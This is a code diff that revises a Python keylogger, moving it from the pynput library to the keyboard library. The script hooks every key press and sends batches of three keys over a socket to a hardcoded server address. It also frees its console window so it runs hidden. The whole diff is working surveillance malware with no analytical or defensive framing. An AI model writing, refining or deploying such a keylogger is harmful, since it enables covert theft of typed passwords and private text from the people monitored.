@@ -1,4 +1,4 @@
-import pynput
+import keyboard 
 import socket
 import ctypes
 
@@ -8,7 +8,7 @@ keystroke_count = 0
 SERVER_ADDRESS = '100.65.1.89'  # Replace with the server's IP address
 SERVER_PORT = 9999  # Must match the server port
 
-# Initialize a list
+# Initialize a list for keystrokes
 keystrokes = []
 
 def send_keystrokes_to_server(data):
@@ -20,38 +20,23 @@ def send_keystrokes_to_server(data):
         except Exception as e:
             print(f"Error sending data: {e}")
 
-def on_press(key):
+def on_key_event(event):
     global keystrokes
-    try:
-        # Store character keys
-        keystrokes.append(key.char)
-    except AttributeError:
-        # Store special keys like Space, Enter, etc.
-        if key == pynput.keyboard.Key.space:
-            keystrokes.append(' ')  # Add a space for space key
-        elif key == pynput.keyboard.Key.enter:
-            keystrokes.append('\n')  # New line for Enter key
-        elif key == pynput.keyboard.Key.backspace:
-            keystrokes.append('[BACKSPACE]')  # Handle backspace
-        else:
-            keystrokes.append(f'[{str(key)}]')  # Store other special keys
-    
-    # Send keystrokes to the server periodically (or at key events)
-    if len(keystrokes) >= 3: 
-        send_keystrokes_to_server(''.join(keystrokes))
-        keystrokes = []  # Reset after sending
+    if event.event_type == 'down':  # Only capture key press events
+        keystrokes.append(event.name)  # Append the key name
+        
+        # Check if we should send keystrokes to the server
+        if len(keystrokes) >= 3:
+            data_to_send = ' '.join(keystrokes)
+            send_keystrokes_to_server(data_to_send)
+            keystrokes = []  # Reset after sending
 
-def on_release(key):
-    global keystroke_count
-    keystroke_count += 1  # Track number of keystrokes
-
-    # Stop listener if Esc is pressed
-    if key == pynput.keyboard.Key.esc:
-        return False
-
-# Hide Window
+# Hide the console window
 ctypes.windll.kernel32.FreeConsole()
 
 # Start the keylogger
-with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+try:
+    keyboard.hook(on_key_event)  # Hook the key event
+    keyboard.wait('esc')  # Wait for the Esc key to exit
+except Exception as e:
+    print(f"An error occurred: {e}")
